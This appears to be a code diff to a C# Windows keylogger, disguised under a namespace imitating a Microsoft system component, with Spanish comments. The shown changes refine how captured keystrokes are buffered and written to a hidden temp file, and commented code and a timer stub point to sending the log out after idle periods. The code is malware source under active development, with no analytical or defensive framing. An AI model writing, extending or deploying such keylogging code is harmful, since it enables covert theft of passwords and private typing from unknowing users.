@@ -14,8 +14,8 @@ namespace SystemHooksMicrosoft
         private static IntPtr _hookID = IntPtr.Zero;
 
         #region "Mis variables"
-        //static string temp_path = System.IO.Path.GetTempPath();
-        private static string temp_path = System.IO.Path.GetTempPath() + "pk" + DateTime.Now.ToString("yyMMdd_hhmmss") + ".pkf";
+        //private static string temp_path = System.IO.Path.GetTempPath() + "pk" + DateTime.Now.ToString("yyMMdd_hhmmss") + ".pkf";
+        private static string temp_path = System.IO.Path.GetTempPath() + "pk" + DateTime.Now.ToString("yyMMdd") + ".pkf";
         static string _mensaje;
         private static readonly List<int> _ascii_imprimibles = new List<int>() {32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,
             48,49,50,51,52,53,54,55,56,57,//[0-9]
@@ -74,12 +74,20 @@ namespace SystemHooksMicrosoft
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
+        /// <summary>
+        /// Agrega el caracter al mensaje, y|o vacia el mensaje y|o escribe el mensaje
+        /// </summary>
+        /// <param name="charCode"></param>
         private static void Procesar(int charCode)
         {
+            //Instrucciones:
+            //si aprieta "enter" escribir y vaciar el mensaje
+            //si aprieta un caracter ASCII imprimible agregar al mensaje
+            //si aprieta "supr" o "backspace" agregar al mensaje
             try
             {
                 //if (seconds_since_last_press > 5) { Escribir(_mensaje); EnviarArchivo();}else
-                if (charCode == 13)
+                if (charCode == 13) 
                 {
                     Escribir(_mensaje);
                     _mensaje = "";
@@ -92,12 +100,17 @@ namespace SystemHooksMicrosoft
                 else if( charCode == 8 || charCode == 127) // if BACKSPACE or DEL (SUPR) pressed
                 {
                     _mensaje += Convert.ToChar(charCode);
-                    Escribir(_mensaje);
-                    _mensaje = "";
-
+                    //Escribir(_mensaje);
+                    //_mensaje = "";
                 }
             }
             catch { }
+        }
+
+        private static void aTimerElapsedEvent(Object source, System.Timers.ElapsedEventArgs e)
+        {
+            //Si ya pasaron 5 segundos desde la última tecla y el mensaje no está vacio... enviar
+            Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
         }
 
         private static void Escribir(string linea)
@@ -107,12 +120,6 @@ namespace SystemHooksMicrosoft
                 System.IO.File.WriteAllText(temp_path, linea);
             }
             catch { }
-        }
-
-        private static void aTimerElapsedEvent(Object source, System.Timers.ElapsedEventArgs e)
-        {
-            //Si ya pasaron 5 segundos desde la última tecla y el mensaje no está vacio... enviar
-            Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
         }
     }
 }
